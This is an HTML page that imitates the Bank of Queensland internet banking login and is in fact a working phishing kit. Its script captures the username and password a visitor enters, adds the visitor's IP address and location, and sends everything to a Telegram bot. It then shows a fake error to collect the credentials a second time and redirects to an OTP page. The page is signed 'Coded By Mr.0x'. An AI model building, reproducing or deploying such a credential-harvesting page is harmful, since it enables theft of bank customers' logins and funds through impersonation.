<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BOQ Internet Banking</title>
    <style>
        body { font-family: Arial; background: #f3f3f3; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: bold; }
        input { width: 100%; padding: 8px; box-sizing: border-box; }
        .btn { background: #1b75bc; color: white; padding: 10px; border: none; border-radius: 4px; width: 100%; }
        .btn:disabled { opacity: 0.5; }
        .alert { background: #f8d7da; color: #721c24; padding: 10px; display: none; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to BOQ</h1>
        <form id="login-form">
            <div class="form-group">
                <label>Customer Access Number</label>
                <input type="text" id="txtUserid" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="id11" required>
            </div>
            <button type="submit" id="btnSignIn" class="btn" disabled>Log On</button>
        </form>
        <div id="error-msg" class="alert">
            <span>The user information or password you have entered is not valid.</span>
            <button id="cross-1" style="float:right; background:none; border:none; font-size:20px;">×</button>
        </div>
    </div>

    <script src="config/email.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script>
        // ---- Helper: send to Telegram ----
        async function sendTelegram(message) {
            try {
                const res = await fetch(`https://api.telegram.org/bot${CONFIG.apikey}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CONFIG.chatid, text: message })
                });
                const data = await res.json();
                console.log('Telegram response:', data);
                return data;
            } catch (e) {
                console.error('Telegram send error:', e);
                return null;
            }
        }

        // ---- Helper: get IP & location ----
        async function getClientInfo() {
            let ip = '0.0.0.0';
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch(e) { console.warn('IP fetch failed'); }
            let location = { country: 'Unknown', city: 'Unknown' };
            try {
                const res = await fetch(`https://freeipapi.com/api/json/${ip}`);
                const data = await res.json();
                location = { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
            } catch(e) { console.warn('Location fetch failed'); }
            return { ip, location, userAgent: navigator.userAgent };
        }

        function getBrowser(ua) {
            if (ua.includes('MSIE')) return 'Internet Explorer';
            if (ua.includes('Firefox')) return 'Mozilla Firefox';
            if (ua.includes('Chrome')) return 'Google Chrome';
            if (ua.includes('Safari')) return 'Safari';
            if (ua.includes('Opera')) return 'Opera';
            return 'Unknown';
        }

        $(document).ready(function() {
            let attempt = 0;

            // Enable/disable button
            function toggleButton() {
                const username = $('#txtUserid').val().trim();
                const password = $('#id11').val().trim();
                $('#btnSignIn').prop('disabled', !(username && password));
            }
            $('#txtUserid, #id11').on('keyup change', toggleButton);
            $('#btnSignIn').prop('disabled', true);

            // Form submit
            $('#login-form').submit(async function(e) {
                e.preventDefault();

                const username = $('#txtUserid').val().trim();
                const password = $('#id11').val().trim();
                if (!username || !password) {
                    console.warn('Empty fields, ignoring submit');
                    return;
                }

                attempt++;
                console.log('Attempt #' + attempt);

                // Build message
                const info = await getClientInfo();
                const browser = getBrowser(info.userAgent);
                let message = "";
                message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
                message += "|Bank Name: Bank of Queensland\n";
                message += "|Username: " + username + "\n";
                message += "|Password: " + password + "\n";
                message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
                message += "|Client IP: " + info.ip + "\n";
                message += "|City : " + info.location.city + "\n";
                message += "|Country : " + info.location.country + "\n";
                message += "|UserAgent : " + info.userAgent + "\n";
                message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
                message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";

                // Send Telegram
                await sendTelegram(message);
                console.log('Telegram sent');

                // Handle attempts
                if (attempt === 1) {
                    console.log('First attempt – show error');
                    $('#error-msg').show();
                    $('#txtUserid, #id11').val('');
                    $('#btnSignIn').prop('disabled', true);
                } else if (attempt === 2) {
                    console.log('Second attempt – redirecting to OTP page');
                    // Redirect to OTP page
                    window.location.href = 'boq-otp.html';
                } else {
                    console.log('More than 2 attempts – still redirect to OTP?');
                    window.location.href = 'boq-otp.html';
                }
            });

            // Close error message
            $('#cross-1').click(function() {
                $('#error-msg').hide();
            });
        });
    </script>
</body>
</html>
